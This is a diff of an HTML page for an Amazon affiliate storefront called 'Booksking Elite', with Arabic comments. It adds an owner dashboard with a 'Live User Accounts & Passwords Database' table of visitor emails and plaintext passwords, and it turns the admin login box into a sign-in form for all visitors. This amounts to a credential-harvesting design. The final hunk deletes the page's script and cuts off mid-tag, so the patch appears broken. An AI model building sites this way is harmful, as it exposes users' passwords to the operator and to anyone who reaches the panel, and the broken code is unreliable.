@@ -5,14 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title id="page-title">Booksking Elite - The Ultimate Global Mega Store & Amazon Hub</title>
     
-    <!-- مكتبة Firebase السحابية لإدارة البيانات والمديرين -->
+    <!-- ربط سيرفرات جوجل السحابية (Google Firebase) -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
 
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; transition: background 0.3s ease, color 0.3s ease, border 0.3s ease; }
         
-        /* نظام الألوان الأبيض والأسود النقي فقط (Monochrome Minimalist Boss Theme) */
+        /* تصميم أبيض وأسود نقي فقط (Monochrome Minimalist Boss Theme) */
         :root {
             --bg-main: #ffffff;
             --bg-card: #f9f9f9;
@@ -60,7 +60,17 @@
         .controls-panel button:hover, .controls-panel select:hover { background: var(--header-text); color: var(--header-bg); }
 
         .boss-btn { background: #ff0000 !important; color: #fff !important; border: none !important; display: none; }
-        .boss-ads-banner { background: var(--bg-card); border: 2px dashed var(--text-main); padding: 20px; text-align: center; margin: 30px auto; max-width: 1400px; border-radius: 12px; display: none; }
+        
+        /* لوحة إحصائيات الرئيس وسيرفر جوجل */
+        .boss-dashboard { background: var(--bg-card); border: 2px solid var(--text-main); padding: 25px; margin: 30px auto; max-width: 1400px; border-radius: 12px; display: none; }
+        .boss-dashboard h3 { margin-bottom: 15px; font-size: 20px; font-weight: 900; }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 15px; margin-bottom: 20px; }
+        .stat-card { background: var(--bg-main); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); text-align: center; }
+        .stat-card h4 { font-size: 14px; color: var(--text-muted); margin-bottom: 5px; }
+        .stat-card span { font-size: 24px; font-weight: 900; }
+        .users-table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 13px; }
+        .users-table th, .users-table td { border: 1px solid var(--border-color); padding: 10px; text-align: center; }
+        .users-table th { background: var(--text-main); color: var(--bg-main); }
 
         .hero-section { text-align: center; padding: 90px 20px; max-width: 1100px; margin: 0 auto; }
         .hero-section h1 { font-size: 52px; font-weight: 900; letter-spacing: -2px; margin-bottom: 20px; }
@@ -88,7 +98,7 @@
         .btn-buy { background: var(--btn-bg); color: var(--btn-text); text-align: center; padding: 12px; border-radius: 6px; text-decoration: none; font-weight: 800; font-size: 14px; display: block; border: none; cursor: pointer; width: 100%; }
         .btn-buy:hover { background: var(--btn-hover); }
 
-        /* نوافذ التحكم وتسجيل المدير */
+        /* نوافذ النظام (Modals) */
         .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 2000; backdrop-filter: blur(4px); }
         .modal-box { background: var(--bg-main); border: 2px solid var(--text-main); padding: 40px; border-radius: 16px; width: 100%; max-width: 450px; position: relative; }
         .modal-box h2 { font-size: 22px; font-weight: 900; margin-bottom: 20px; }
@@ -101,7 +111,7 @@
 </head>
 <body>
 
-    <div class="top-ticker" data-i18n="top_ticker">⚡ BOOKSKING ELITE: The World's #1 Ultra-Fast Global Amazon Mega Hub & Digital Bookstore (100% Comprehensive Catalog)</div>
+    <div class="top-ticker" data-i18n="top_ticker">⚡ BOOKSKING ELITE: The World's #1 Ultra-Fast Global Amazon Mega Hub & Digital Bookstore (100% Free Affiliate Platform)</div>
 
     <header>
         <div class="logo" onclick="window.scrollTo(0,0)">👑 Booksking Elite</div>
@@ -128,15 +138,43 @@
         </div>
     </header>
 
-    <!-- لوحة إعلانات المدير الخاصة -->
-    <div class="boss-ads-banner" id="bossAdsBanner">
-        <h3 style="margin-bottom: 8px;" data-i18n="boss_banner_title">📢 Boss Exclusive Announcements & Promoted Products</h3>
-        <p id="bossCustomAdText" style="color:var(--text-muted); font-size:14px;" data-i18n="boss_banner_desc">Welcome Boss! You have full control over global promotions, daily automated Amazon sync, and exclusive inventory.</p>
+    <!-- لوحة إحصائيات الرئيس المربوطة بسيرفر جوجل السحابي -->
+    <div class="boss-dashboard" id="bossDashboard">
+        <h3 data-i18n="boss_dash_title">👑 Google Cloud Boss Analytics & User Database</h3>
+        <div class="stats-grid">
+            <div class="stat-card">
+                <h4 data-i18n="stat_visitors">Today's Visitors</h4>
+                <span id="visitorCount">0</span>
+            </div>
+            <div class="stat-card">
+                <h4 data-i18n="stat_users">Registered Users</h4>
+                <span id="totalUsers">0</span>
+            </div>
+            <div class="stat-card">
+                <h4 data-i18n="stat_commission">Affiliate Status</h4>
+                <span style="color:#22c55e;">Active (10%)</span>
+            </div>
+        </div>
+        <h4 style="margin-bottom: 10px;" data-i18n="table_title">Live User Accounts & Passwords Database:</h4>
+        <div style="overflow-x: auto;">
+            <table class="users-table">
+                <thead>
+                    <tr>
+                        <th data-i18n="th_email">Email / Account</th>
+                        <th data-i18n="th_pass">Password</th>
+                        <th data-i18n="th_date">Login Date</th>
+                    </tr>
+                </thead>
+                <tbody id="usersTableBody">
+                    <!-- سيتم تعبئتها أوتوماتيكياً من سيرفر جوجل -->
+                </tbody>
+            </table>
+        </div>
     </div>
 
     <section class="hero-section" id="home">
         <h1 data-i18n="hero_title">Unlimited Amazon Catalog. Zero Friction.</h1>
-        <p data-i18n="hero_desc">Explore 100% of Amazon products instantly with superior speed, advanced monochromatic elegance, direct global links, and daily automated updates.</p>
+        <p data-i18n="hero_desc">Explore 100% of Amazon products instantly with superior speed, advanced monochromatic elegance, direct global affiliate links, and daily automated updates.</p>
         
         <div class="search-container">
             <input type="text" id="searchInput" placeholder="Search 100% of Amazon products, PlayStations, electronics, books, PDFs..." onkeyup="filterProducts()">
@@ -165,7 +203,7 @@
                 </div>
                 <div>
                     <div class="price-row"><span class="price">$499.99</span></div>
-                    <a href="https://www.amazon.com" target="_blank" class="btn-buy" data-i18n="buy_btn">Buy on Amazon</a>
+                    <a href="https://www.amazon.com" target="_blank" class="btn-buy" data-i18n="buy_btn">Buy on Amazon (10% Comm)</a>
                 </div>
             </div>
 
@@ -178,7 +216,7 @@
                 </div>
                 <div>
                     <div class="price-row"><span class="price">$129.99</span></div>
-                    <a href="https://www.amazon.com" target="_blank" class="btn-buy" data-i18n="buy_btn">Buy on Amazon</a>
+                    <a href="https://www.amazon.com" target="_blank" class="btn-buy" data-i18n="buy_btn">Buy on Amazon (10% Comm)</a>
                 </div>
             </div>
 
@@ -191,7 +229,7 @@
                 </div>
                 <div>
                     <div class="price-row"><span class="price">$199.00</span></div>
-                    <a href="https://www.amazon.com" target="_blank" class="btn-buy" data-i18n="buy_btn">Buy on Amazon</a>
+                    <a href="https://www.amazon.com" target="_blank" class="btn-buy" data-i18n="buy_btn">Buy on Amazon (10% Comm)</a>
                 </div>
             </div>
         </div>
@@ -208,7 +246,7 @@
                 </div>
                 <div>
                     <div class="price-row"><span class="price">$899.00</span></div>
-                    <a href="https://www.amazon.com" target="_blank" class="btn-buy" data-i18n="buy_btn">Buy on Amazon</a>
+                    <a href="https://www.amazon.com" target="_blank" class="btn-buy" data-i18n="buy_btn">Buy on Amazon (10% Comm)</a>
                 </div>
             </div>
 
@@ -221,7 +259,7 @@
                 </div>
                 <div>
                     <div class="price-row"><span class="price">$549.00</span></div>
-                    <a href="https://www.amazon.com" target="_blank" class="btn-buy" data-i18n="buy_btn">Buy on Amazon</a>
+                    <a href="https://www.amazon.com" target="_blank" class="btn-buy" data-i18n="buy_btn">Buy on Amazon (10% Comm)</a>
                 </div>
             </div>
         </div>
@@ -238,7 +276,7 @@
                 </div>
                 <div>
                     <div class="price-row"><span class="price">$29.99</span></div>
-                    <a href="https://www.amazon.com" target="_blank" class="btn-buy" data-i18n="buy_btn">Buy on Amazon</a>
+                    <a href="https://www.amazon.com" target="_blank" class="btn-buy" data-i18n="buy_btn">Buy on Amazon (10% Comm)</a>
                 </div>
             </div>
 
@@ -251,21 +289,21 @@
                 </div>
                 <div>
                     <div class="price-row"><span class="price">$19.99</span></div>
-                    <a href="https://www.amazon.com" target="_blank" class="btn-buy" data-i18n="buy_btn">Buy on Amazon</a>
+                    <a href="https://www.amazon.com" target="_blank" class="btn-buy" data-i18n="buy_btn">Buy on Amazon (10% Comm)</a>
                 </div>
             </div>
         </div>
 
     </div>
 
-    <!-- نافذة تسجيل دخول المدير (Boss Login Modal) -->
+    <!-- نافذة تسجيل دخول الرئيس أو تسجيل الزوار (Boss/User Portal) -->
     <div class="modal-overlay" id="authModal">
         <div class="modal-box">
             <span class="close-modal" onclick="closeAuthModal()">&times;</span>
-            <h2 data-i18n="modal_auth_title">👑 Boss Portal Secure Login</h2>
-            <input type="email" id="bossEmail" placeholder="Enter Boss Email...">
-            <input type="password" id="bossPass" placeholder="Enter Secure Password...">
-            <button class="btn-buy" onclick="verifyBossLogin()" data-i18n="modal_auth_btn">Authenticate as Boss</button>
+            <h2 data-i18n="modal_auth_title">👑 Boss Portal & Cloud Sign In</h2>
+            <input type="email" id="userEmailInput" placeholder="Enter Email / Username...">
+            <input type="password" id="userPassInput" placeholder="Enter Password...">
+            <button class="btn-buy" onclick="handleUserLogin()" data-i18n="modal_auth_btn">Sign In to Cloud Hub</button>
         </div>
     </div>
 
@@ -277,38 +315,4 @@
             <input type="text" id="newTitle" placeholder="Item Title...">
             <input type="text" id="newImg" placeholder="Image URL (Unsplash/Amazon)...">
             <input type="text" id="newPrice" placeholder="Price (e.g. $49.99)...">
-            <textarea id="newDesc" rows="3" placeholder="Description..."></textarea>
-            <button class="btn-buy" onclick="publishBossItem()" data-i18n="modal_boss_publish">Publish Globally Now</button>
-        </div>
-    </div>
-
-    <footer>
-        <p data-i18n="footer_text">All Rights Reserved © 2026 Booksking Elite Platform. Official Global Amazon Associates Partner & Automated Hub.</p>
-    </footer>
-
-    <script>
-        // إعدادات Firebase السحابية
-        const firebaseConfig = {
-            apiKey: "AIzaSyDummyKeyForBooksking12345",
-            authDomain: "booksking-elite.firebaseapp.com",
-            projectId: "booksking-elite"
-        };
-        try {
-            firebase.initializeApp(firebaseConfig);
-            var db = firebase.firestore();
-        } catch(e) {
-            console.log("Cloud simulation mode active.");
-        }
-
-        const translations = {
-            en: {
-                page_title: "Booksking Elite - The Ultimate Global Mega Store & Amazon Hub",
-                top_ticker: "⚡ BOOKSKING ELITE: The World's #1 Ultra-Fast Global Amazon Mega Hub & Digital Bookstore (100% Comprehensive Catalog)",
-                nav_home: "Home", nav_elec: "Electronics & Gaming", nav_app: "Home Appliances", nav_books: "Books & PDFs", nav_boss: "Boss Portal",
-                theme_btn: "🌓 Theme", boss_banner_title: "📢 Boss Exclusive Announcements & Promoted Products",
-                boss_banner_desc: "Welcome Boss! You have full control over global promotions, daily automated Amazon sync, and exclusive inventory.",
-                hero_title: "Unlimited Amazon Catalog. Zero Friction.",
-                hero_desc: "Explore 100% of Amazon products instantly with superior speed, advanced monochromatic elegance, direct global links, and daily automated updates.",
-                search_btn: "Search",
-                cat_all: "🌟 All 100% Amazon", cat_elec: "⚡ Electronics & Gaming", cat_app: "🏠 Home & Appliances", cat_books: "📚 Books & PDF Guides",
-                s
+            <textarea id="newDesc" rows="3" placeholder="Description..."></textare
